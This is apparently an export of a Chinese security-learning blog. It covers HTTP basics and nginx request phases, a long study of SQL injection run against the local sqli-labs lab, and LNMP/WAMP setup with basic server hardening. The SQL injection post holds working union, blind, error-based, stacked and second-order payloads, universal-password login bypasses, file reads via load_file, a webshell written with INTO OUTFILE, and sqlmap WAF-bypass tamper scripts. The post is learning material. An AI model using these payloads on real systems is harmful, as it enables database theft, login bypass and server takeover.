HTTPS过程HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。具体过程请参考经典的阮一峰先生的博客TLS/SSL握手过程。HTTPS相比于HTTP，虽然提供了安全保证，但是势必会带来一些时间上的损耗，如握手和加密等过程，是否使用HTTPS需要根据具体情况在安全和性能方面做出权衡。 HTTP请求HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。 请求行格式如下： Method Request-URL HTTP-Version CRLF eg: GET index.html HTTP/1.1 常用的方法有: GET, POST, PUT, DELETE, OPTIONS, HEAD。 请求报头请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。 PS: 客户端不一定特指浏览器，有时候也可使用Linux下的CURL命令以及HTTP客户端测试工具等。常见的请求报头有: Accept, Accept-Charset, Accept-Encoding, Accept-Language, Content-Type, Authorization, Cookie, User-Agent等。 请求报头中使用了Accept, Accept-Encoding, Accept-Language, Cache-Control, Connection, Cookie等字段。Accept用于指定客户端用于接受哪些类型的信息，Accept-Encoding与Accept类似，它用于指定接受的编码方式。Connection设置为Keep-alive用于告诉客户端本次HTTP请求结束之后并不需要关闭TCP连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间。 请求正文当使用POST, PUT等方法时，通常需要客户端向服务器传递数据。这些数据就储存在请求正文中。在请求包头中有一些与请求正文相关的信息，例如:现在的Web应用通常采用Rest架构，请求的数据格式一般为json。这时就需要设置Content-Type: application/json。 服务器处理请求并返回HTTP报文后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTPRequest对象，供上层使用。这一部分工作一般是由Web服务器去进行，我使用过的Web服务器有Tomcat, Jetty和Netty等等。 HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。 状态码状态码是由3位数组成，第一个数字定义了响应的类别，且有五种可能取值: 1xx：指示信息–表示请求已接收，继续处理。 2xx：成功–表示请求已被成功接收、理解、接受。 3xx：重定向–要完成请求必须进行更进一步的操作。 4xx：客户端错误–请求有语法错误或请求无法实现。 5xx：服务器端错误–服务器未能实现合法的请求。平时遇到比较常见的状态码有:200, 204, 301, 302, 304, 400, 401, 403, 404, 422, 500 200：请求已成功。 204：服务器已处理请求，但不返回任何实体内容，并且希望返回更新了的元信息。若客户端是浏览器的话，那么浏览器应保留发送该请求的页面，而不更改任何文档视图。 301：永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。 302：临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI。 304：如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。 400：客户端请求包含语法错误，服务器无法理解。 401：请求要求用户进行身份认证。 403：服务器理解请求客户端的请求，但是拒绝执行此请求。 404：请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。 422：请求格式正确，但是由于含有语义错误，无法响应。 500：服务器内部错误。 响应报头常见的响应报头字段有: Server, Connection…。 响应报文服务器返回给浏览器的文本信息，通常HTML, CSS, JS, 图片等文件就放在这一部分。 浏览器解析渲染页面浏览器在收到HTML,CSS,JS文件后，它是如何把页面呈现到屏幕上的？下图对应的就是WebKit渲染的过程。 浏览器是一个边解析边渲染的过程。 JS的解析是由浏览器中的JS解析引擎完成的 浏览器在解析过程中，如果遇到请求外部资源时，如图像,iconfont,JS等。浏览器将重复1-6过程下载该资源。请求过程是异步的，并不会影响HTML文档进行加载，但是当文档加载过程中遇到JS文件，HTML文档会挂起渲染过程，不仅要等到文档中JS文件加载完毕还要等待解析执行完毕，才会继续HTML的渲染过程。原因是因为JS有可能修改DOM结构，这就意味着JS执行完成前，后续所有资源的下载是没有必要的，这就是JS阻塞后续资源下载的根本原因。CSS文件的加载不影响JS文件的加载，但是却影响JS文件的执行。JS代码执行前浏览器必须保证CSS文件已经下载并加载完毕。 WEB页面解析流程如图： nginx将HTTP请求处理流程分为11个阶段 NGX_HTTP_POST_READ_PHASE：第一个阶段，ngx_http_realip_module模块会注册handler到该阶段（nginx作为代理服务器时有用，后端以此获取客户端原始IP），而该模块默认不会开启，需要通过–with-http_realip_module启动； NGX_HTTP_SERVER_REWRITE_PHASE：server块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_FIND_CONFIG_PHASE：查找匹配的location配置；该阶段不能自定义handler； NGX_HTTP_REWRITE_PHASE：location块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_POST_REWRITE_PHASE：该阶段会检查是否发生了url重写，如果有，重新回到FIND_CONFIG阶段，否则直接进入下一个阶段；该阶段不能自定义handler； NGX_HTTP_PREACCESS_PHASE：访问控制，比如限流模块ngx_http_limit_req_module会注册handler到该阶段； NGX_HTTP_ACCESS_PHASE：访问权限控制，比如基于ip黑白名单的权限控制，基于用户名密码的权限控制等； NGX_HTTP_POST_ACCESS_PHASE：该阶段会根据访问权限控制阶段做相应处理，不能自定义handler； NGX_HTTP_TRY_FILES_PHASE：只有配置了try_files指令，才会有此阶段，不能自定义handler； NGX_HTTP_CONTENT_PHASE：内容产生阶段，返回响应给客户端；ngx_http_fastcgi_module模块就处于该阶段； NGX_HTTP_LOG_PHASE：该阶段会记录日志 参考资料https://www.zhihu.com/question/23042131/answer/66571369 https://www.freebuf.com/articles/web/190947.html http://www.lijiejie.com/dns-zone-transfer-1/ https://vulhub.org/#/docs/ https://segmentfault.com/a/1190000020178836 https://segmentfault.com/a/1190000006879700 https://segmentfault.com/a/1190000019263330 https://segmentfault.com/a/1190000006689767]]></content>
  </entry>
  <entry>
    <title><![CDATA[sql注入的payload]]></title>
    <url>%2F2019%2F09%2F01%2Fsql%E6%B3%A8%E5%85%A5%E7%9A%84payload%2F</url>
    <content type="text"><![CDATA[学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap ​ 内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中包含了敏感信息 ▲联合查询的类型▲堆查询注入 回显注入：利用注入漏洞可以改变页面返回数据 ▲SQL 盲注•基于布尔 SQL 盲注 通过条件是否成立来判断substr截取第一个字符判断是否大于’a’，成立则页面返回数据 •基于时间的 SQL 盲注通过返回时间的长短判断 获取第一个字符的ascii码，判断是否大于115，不成立延时5秒返回 •基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的基于程度和顺序的注入(哪里发生了影响)★一阶注射★二阶注射一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间接的对 WEB 产生危害， 这样的就被称为是二阶注入. 基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射） 以上就是通常分类，先记录下，通过后面的实验练习加深理解 2、系统函数介绍几个常用函数： version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本 3、字符串连接函数 concat(str1,str2,…)——没有分隔符地连接字符串 concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 以上三个函数能一次性查出所有信息 . 4、一般用于尝试的语句 Ps:–+可以用#替换， url 提交过程中 Url 编码后的#为%23 or 1=1–+‘or 1=1–+“or 1=1–+)or 1=1–+‘)or 1=1–+“) or 1=1–+“))or 1=1–+ 一般的代码为：$id=$_GET[‘id’];$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点， 一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ， 一般采用两种思 路， 闭合后面的引号或者注释掉， 注释掉采用–+ 或者 #（%23） 5、union 操作符的介绍UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 请注意， UNION 内部的 SELECT语句必须拥有相同数量的列。 列也必须拥有相似的数据类型。 同时， 每条 SELECT 语句中的列的顺序必须相同。 SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2注释： 默认地， UNION 操作符选取不同的值。 如果允许重复的值， 请使用 UNION ALL。 另外， UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 6 、sql 中的逻辑运算万能密码： 正常 Select * from admin where username=’ admin’ and password=’ admin’ 密码：’ or 1=1# Select * from admin where username=’ admin’ and password=’ ’ or 1=1# where 子 句后有 三 个 条 件 语 句 ==username=’ admin’ andpassword=’ ’ or 1=1，在sql 中and 运算优先级大于or的运算优先级，结果恒为真。 7、 注入流程 数据库存储的数据形式如上图，注入的过程就是先拿到数据库名，再获取当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据 Mysql 有一个系统数据库 information_schema， 存储着所有的数据库的相关信息， 一般的，我们利用该表可以进行一次完整的注入。 以下为一般的流程 ： 猜数据库 ： 猜某库的数据表 ： select table_name from information_schema.tables where table_schema=’dvwa’ 猜某表的所有列 select column_name from information_schema.columns where table_name=’users’ 获取某列的内容 select * from 表名； 第部分：实验演示联合查询的类型 payload：-1’union select 1,group_concat(schema_name),3 from information_schema.schemata –+ 1、group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 2、union 联合注入， union 的作用是将两个 sql 语句进行联合， union 前后的两个 sql 语句的选择列数要相同才可以。 Union all 与 union 的区别是增加了去重的功能 3、当 id 的数据在数据库中不存在时， id=-1， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空，就将后面的语句的内容显示出来，此处前台页面返回了我们构造的 union 的数据 4、此处利用 order by 对前面的数据进行排序， 这里有三列数据， 我们就只能用order by 3,超过 3 就会报错。‘order by 4–+的结果显示结果超出。 盲注盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息到前端页面。 盲注可以分为三类： •基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 1： 基于布尔 SQL 盲注-构造逻辑判断 截取字符串相关函数解析 ▲left(database(),1)&gt;’ s’ //left()函数 Explain:database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位 ▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+ //substr()函数， ascii()函数 Explain： substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度。 Ascii()将某个字符转换为 ascii 值 ▲ascii(substr((select database()),1,1))=98 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数， MID()函数 Explain： mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位Ord()函数同 ascii()， 将字符转为 ascii 值 ▲regexp 正则注入 存疑正则注入介绍用法介绍： select user() regexp ‘^[a-z]’;Explain： 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。 ▲like 匹配注入 和上述的正则类似， mysql 在匹配的时候我们可以用 ike 进行匹配。用法： select user() like ‘ro% 2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来 存疑▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性， 此处重复了 version， 所以报错。 3:基于时间的 SQL 盲注–延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep IF表达式 1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 布尔盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39;and left(version(),1)=5# 1） 利用 left(database(),1)进行尝试 查看 version()， 数据库的版本号为 10.1.36, 这句话的意思是查看版本号第一位是不是1， 明显的返回的结果是正确的 当版本号不正确的时候， 则不能正确显示 you are in…… http://127.0.0.1/sqllib/Less-5/?id=1 ‘and length(database())=8 –+ 判读数据库长度 猜测数据库第一位 继而猜测第二位 采用二分法 报错盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39; union Select 1,count(),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)2))a from information_schema.columns group by a–+ 利用 double 数值类型超出范围进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3–+ 利用 bigint 溢出进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (!(select * from (select user())x) - ~0),2,3--+ xpath 函数报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+ http://127.0.0.1/sqllib/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)–+ 利用数据的重复性http://127.0.0.1/sqllib/Less-5/?id=1&#39;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+ 演示盲注演示http://127.0.0.1/sqllib/Less-5/?id=1’and if(ascii(substr(database(),1,1))=116,1,sleep(5))–+ 当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入 当结果正确的时候， 运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次， 会占用一段时间。 http://127.0.0.1/sqllib/Less-5/?id=1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+ 猜数据库： http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 说明第一位是 s （ascii 码是 115） http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第二位是 e （ascii 码是 101） 以此类推 猜出数据的名字是security 猜测 security 的数据表：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+猜测第一个数据表的第一位是 e,…依次类推， 得到 emails http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+猜测第二个数据表的第一位是 r,…依次类推， 得到 referers 以此类推， 我们可以得到所有的数据表 emails,referers,uagents,users 猜测users表的列 http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from informationschema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+猜测 users 表的第一个列的第一个字符是 i，以此类推， 我们得到列名是 id， username， password 猜测 username 的值：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+猜测 username 的第一行的第一位以此类推， 我们得到数据库 username， password 的所有内容 文件的导入导出1、 load_file()导出文件Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。使用条件：A、 必须有权限读取并且文件必须完全可读and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。and (select count() from mysql.user)&gt;0/ 返回错误， 应该是管理员给数据库帐户降权B、 欲读取文件必须在服务器上C、 必须指定文件完整的路径Mysql 注入—sqlilabs—lcamry30D、 欲读取文件必须小于 max_allowed_packet如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有administrators 才能访问的文件， users 就别想 load_file 出来。在实际的注入中， 我们有两个难点需要解决：绝对物理路径构造有效的畸形语句 （报错爆出绝对路径）在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务器的安全将受到严重的威胁。常用路径：http://www.cnblogs.com/lcamry/p/5729087.html示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\boot.ini)Explain:路径里的/用 \代替 2、 文件导入到数据库LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行， 并装入一个表中。 文件名称必须为一个文字字符串。 在注入过程中， 我们往往需要一些特殊的文件， 比如配置文件， 密码文件等。 当你具有数据库的权限时， 可以将系统文件利用 load data infile 导入到数据库中。 示例： load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’lines terminated by ‘\n’ 将/tmp/t0.txt 导入到 t0 表中， character set gbk 是字符集设置为 gbk， fields terminated by 是每一项数据之间的分隔符， lines terminated by 是行的结尾符。 当错误代码是 2 的时候的时候， 文件不存在， 错误代码为 13 的时候是没有权限， 可以考虑/tmp 等文件夹。 3、 导入到文件SELECT…..INTO OUTFILE ‘file_name’ 可以把被选择的行写入一个文件中。 该文件被创建到服务器主机上， 因此您必须拥有 FILE权限， 才能使用此语法。 file_name 不能是一个已经存在的文件。 有两种形式： 第一种直接将 select 内容导入到文件中： Select version() into outfile “c:\phpnow\htdocs\test.php”此处将 version()替换成一句话， 也即Select into outfile “c:\phpnow\htdocs\test.php” 然后直接连一句话 第二种修改文件结尾：Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件 解释： 通常是用‘\r\n’ 结尾， 此处我们修改为自己想要的任何文件。 同时可以用 FIELDSTERMINATED BY16 进制可以为一句话或者其他任何的代码， 可自行构造。 在 sqlmap 中 os-shell 采取的就是这样的方式， 具体可参考 os-shell 分析文章： http://www.cnblogs.com/lcamry/p/5505110.html http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,3 into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.txt” –+ 写入一句话木马 http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,’‘ into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.php” –+ 后续就可以上菜刀了 POST 注入输入正确用户名和密码 提交 username 和 password 后， 后台形成的 sql 语句为 $sql=”SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1”; 万能密码: 用户名：admin’or’1’=’1# admin ‘ # 密码：密码随便输入 $sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and password=’$passwd’ LIMIT 0,1”; 猜测数据库第一位 uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit 增删改函数介绍 增加一行数据 INSERT insert into users values(‘16’,’lcamry’,’lcamry’); 删除一行数据 ​ 修改一行数据 updata 表名 set 列名=’新的值， 非数字加单引号’ where id=6; HTTP 头部注入User-Agent 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1 Referer 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 cookie 注入 报错了 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 二次排序什么是二次排序：二次排序注入也成为存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出触发sql 注入。 二次排序注入思路： 黑客通过构造数据的形式， 在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理， 提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。 黑客向服务端发送第二个与第一次不相同的请求数据信息。 服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。 注册用户名为admin’# 密码为123的账号 登录用户名 admi’# 并修改密码 可以看到admin 密码被修改了 Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ ANDpassword=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’admin’ 利用注册的admin’# 修改密码时候从数据库提取该数据 造成了数据 命令拼接 宽字节注入mysql 在使用 GBK 编码的时候， 会认为两个字符为一个汉字， 例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围） 。 我们在过滤 ’ 的时候， 往往利用的思路是将 ‘ 转换为 \’ 1、 %df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27， 我们在%5c%27 前面添加%df， 形成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。2、 将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。 这也是 bypass 的一种方法。 get 型的方式我们是以 url 形式提交的， 因此数据会通过 URLencode post 型的注入当中， 将 utf-8 转换为 utf-16 或 utf-32， 例如将 ‘ 转为 utf-16 为 � ‘ 堆叠注入1、在 SQL 中， 分号（;） 是用来表示一条 sql 语句的结束。 2、在 ; 结束一个 sql语句后继续构造下一条语句就造就了堆叠注入。 3、与union injection（联合注入）的 区别就在于 union或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠 注入可以执行的是任意的语句 堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用 union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表名， 列名等信息 PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符。 堆叠注入payload： http://127.0.0.1/sqli-labs/Less-38/index.php?id=1%27;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–+ Tamper详解原始注入遇到困难时，可尝试加载相应脚本，进行绕过用法： –tamper**“脚本名称”(可使用多个tamper) sqlmap版本1.2.7.20，共有57个tamper脚本 序号 脚本名称 注释 1 0x2char 将每个编码后的字符转换为等价表达 2 apostrophemask 单引号替换为Utf8字符，用于过滤单引号 3 apostrophenullencode 替换双引号为%00%27 4 appendnullbyte 有效代码后添加%00 5 base64encode 使用base64编码 6 between 比较符替换为between 7 bluecoat 空格替换为随机空白字符，等号替换为like 8 chardoubleencode 双url编码 9 charencode 将url编码(不处理已经编码的字符) 10 charunicodeencode 使用unicode编码 11 charunicodeescape 以指定的payload反向编码未编码的字符 12 commalesslimit 改变limit语句的写法 13 commalessmid 改变mid语句的写法 14 commentbeforeparentheses 在括号前加内联注释 15 concat2concatws 替换CONCAT为CONCAT_WS 16 equaltolike 等号替换为like 17 escapequotes 双引号替换为\ 18 greatest 大于号替换为greatest，绕过对&gt;的过滤 19 halfversionedmorekeywords 在每个关键字前加注释 20 htmlencode html编码所有非字母和数字的字符 21 ifnull2casewhenisnull 改变ifnull语句的写法 22 ifnull2ifisnull 替换ifnull为if(isnull(A)) 23 informationschemacomment 标示符后添加注释 24 least 替换大于号为least 25 lowercase 全部替换为小写值 26 modsecurityversioned 空格替换为查询版本的注释 27 modsecurityzeroversioned 添加完整的查询版本的注释 28 multiplespaces 添加多个空格 29 nonrecursivereplacement 替换预定义的关键字 30 overlongutf8 将所有字符转义为utf8 31 overlongutf8more 以指定的payload转换所有字符 32 percentage 每个字符前添加% 33 plus2concat 将加号替换为concat函数 34 plus2fnconcat 将加号替换为ODBC函数{fn CONCAT()} 35 randomcase 字符大小写随机替换 36 randomcomments /**/分割关键字 37 securesphere 添加某字符串 38 sp_password 追加sp_password字符串 39 space2comment 空格替换为/**/ 40 space2dash 空格替换为–加随机字符 41 space2hash 空格替换为#加随机字符 42 space2morecomment 空格替换为/_/ 43 space2morehash 空格替换为#加随机字符及换行符 44 space2mssqlblank 空格替换为其他空符号 45 space2mssqlhash 空格替换为%23%0A 46 space2mysqlblank 空格替换为其他空白符号 47 space2mysqldash 空格替换为–%0A 48 space2plus 空格替换为加号 49 space2randomblank 空格替换为备选字符集中的随机字符 50 symboliclogical AND和OR替换为&amp;&amp;和\ \ 51 unionalltounion union all select替换为union select 52 unmagicquotes 宽字符绕过GPC 53 uppercase 全部替换为大写值 54 varnish 添加HTTP头 55 versionedkeywords 用注释封装每个非函数的关键字 56 versionedmorekeywords 使用注释绕过 57 xforwardedfor 添加伪造的HTTP头 脚本base64encode.py内容 –dbs –base64encode.py 参考资料：SQL注入回顾篇(四)/#权限常用参数 sqli-SQL注入总结]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2FLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建-LNMPUbuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择 最小安装 格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证 环境搭建-WAMPwindows系统环境 安装ApacheApache 下载位置http://archive.apache.org/dist/httpd/binaries/win32/ 安装文件位置默认 安装完成 测试 安装mysql下载链接 https://www.zyboe.com/pan/273367p694614 一直下一步，选择默认路径安装 完成安装 配置 Development Machine：开发机器，MySQL会占用最少量的内存。 Server Machine：服务器机器，几个服务器应用会运行在机器上，适用于作为网站或应用的数据库服务器，会占用中等内存。 Dedicated Machine：专用机器，机器专门用来运行MySQL数据库服务器，会占用机器的所有可用内存。 根据自己的用途选择相应的类型配置，我这里为了后面做高并发性能测试便选择“Server Machine”类型。 常用的是TCP/IP连接，勾选该选项框，默认端口号是3306，可在输入框中更改 选择编码 添加到CMD 环境变量 设置root密码 Mysql@123 完成安装 安装PHP将文件夹复制到与apache安装路径同 编辑文件 PHP与apache的整合： 将改文件修改为php.ini: 编辑apache的配置文件： 添加首页文件 PHP与mysql整合 在php配置文件中修改拓展类型的路径： 开启mysql扩展类型 测试 创建www文件夹，并修改目录路径 数据库连接 服务器加固windows1.及时更新系统补丁 2.设置密码强度 3.屏幕保护（锁屏时间） 4.禁止远程连接 5.增强日志审核 等等。。。。 LINUX1.删除用不到的那些普通用户 2.SSH相关加固思路： SSH修改端口：不让端口扫描器轻易发现 不允许Root远程登录：root权限太大，只允许一般账户远程登录 3.防火墙加固思路：主要就是限制端口的对外访问，暴露越少相对越安全 查看用户 ，对于一些保留的系统伪账户：bin、sys、adm、uucp、lp、nuucp、hpdb、www、daemon等可根据需要锁定登陆 锁定不必要：passwd -l &lt;用户名&gt;解锁账号：passwd -u &lt;用户名&gt; ssh的配置 SSH的配置：/etc/ssh/sshd_config 重启下ssh：sudo systemctl restart ssh 验证：下次登录的时候使用的端口就是修改后的了 防火墙： #开启/关闭/查看防火墙状态sudo ufw enable|disable|status# 开通3306端口sudo ufw allow 3306/tcp# 禁用本机的3306端口sudo 